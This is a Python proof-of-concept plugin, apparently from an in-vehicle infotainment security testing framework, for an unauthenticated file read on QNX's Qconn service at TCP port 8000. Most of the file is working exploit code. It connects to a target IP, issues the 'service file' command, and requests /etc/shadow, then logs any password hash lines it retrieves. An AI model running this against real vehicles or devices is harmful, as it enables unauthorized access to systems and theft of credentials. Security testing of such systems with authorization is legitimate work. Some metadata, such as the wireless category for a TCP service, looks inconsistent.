"""
PoC Name: QNX Qnet Unauthorized File Read
CVE: CVE-2017-3891
Component: Wireless Stack
Category: Wireless
Severity: Critical
CVSS: 9.1
Description: Qnet/Qconn服务暴露允许远程读取敏感文件
Prerequisites: 与基于 QNX 的 IVI 系统网络可达。
Usage: python3 01_QNX_Qnet_File_Read.py <target_ip>
"""
import sys
import socket
from iv_plugin_base import IVIVulnerabilityPlugin

class QNXQconnReadPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-001"
    meta_poc_name = "QNX Qnet File Read"
    meta_cve_id = "CVE-2017-3891"
    meta_severity = "Critical"
    meta_protocol = "rf"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        if not self.target_ip or self.target_ip == 'N/A':
            self.logger.error("需要指定目标IP地址。")
            return False
        return True

    def exploit(self):
        self.logger.info(f"探测目标 {self.target_ip} 的 Qconn(TCP 8000) 服务...")
        
        try:
            # 连接到 Qconn 服务口
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3.0)
            
            try:
                sock.connect((self.target_ip, 8000))
                self.logger.info("[+] 成功与 Qconn (8000) 建立 TCP 连接。")
                
                # Qconn 预期一个欢迎横幅
                banner = sock.recv(1024).decode(errors='ignore')
                if banner:
                    self.logger.info(f"  [Banner] {banner.strip()}")
                
                # 发送未授权服务读取命令 (经典 'service file' 漏洞或者 shell)
                self.logger.info("尝试利用 Qconn 机制调用 service file 读取 /etc/shadow...")
                
                # 注入服务指令
                cmd = b"service file\n"
                sock.sendall(cmd)
                response1 = sock.recv(1024).decode(errors='ignore')
                
                # 请求文件读取
                pay = b"o/etc/shadow\n"
                sock.sendall(pay)
                response2 = sock.recv(2048).decode(errors='ignore')
                
                if response2 and 'root:' in response2:
                    self.logger.warning("[!] 漏洞存在：成功越权读取到了受保护的文件内容！")
                    for line in response2.splitlines()[:5]:
                        self.logger.warning(f"  {line}")
                        
                    return {
                        "status": "success",
                        "vulnerable": True,
                        "details": "Successfully read file /etc/shadow via unauthenticated Qconn."
                    }
                else:
                    self.logger.info("目标可能拒绝了非法文件读取。未触发漏洞。")
                    return {
                        "status": "success",
                        "vulnerable": False,
                        "details": "Target rejected unauth file request."
                    }
            
            except socket.timeout:
                self.logger.error("[-] 连接或响应超时 (Timeout)。")
                return {"status": "error", "vulnerable": False, "details": "Timeout"}
            except ConnectionRefusedError:
                self.logger.info("[-] 连接被拒绝 (Connection Refused)。端口可能关闭。")
                return {"status": "success", "vulnerable": False, "details": "Port 8000 closed"}
                
        except Exception as e:
            self.logger.error(f"执行异常: {e}")
            return {"status": "error", "details": str(e)}
        finally:
             sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 01_QNX_Qnet_File_Read.py <target_ip>")
        sys.exit(1)
    plugin = QNXQconnReadPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
